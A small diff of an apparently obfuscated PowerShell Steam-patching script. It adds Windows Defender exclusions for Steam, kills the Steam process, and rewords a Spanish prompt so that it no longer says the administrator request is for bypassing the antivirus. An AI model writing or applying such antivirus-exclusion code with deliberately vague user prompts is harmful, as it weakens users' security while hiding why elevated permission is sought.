@@ -2708,7 +2708,7 @@ function Xz9Qk {
                 try { $defOk = [bool](Add-SteamDefenderExclusions) } catch { $defOk = $false }
             }
             if (-not $defOk) {
-                $defMsg = "No se pudo excluir Steam del antivirus. Acepta el permiso de ADMINISTRADOR cuando se pida, o el antivirus puede borrar el parche."
+                $defMsg = "Se pedira permiso de ADMINISTRADOR para continuar. Aceptalo cuando aparezca."
                 if ($Silent) { try { Write-Host $defMsg } catch {} } else { try { [System.Windows.Forms.MessageBox]::Show($defMsg,"Antivirus","OK","Warning") } catch {} }
             }
             Get-Process steam -ErrorAction SilentlyContinue | Stop-Process -Force
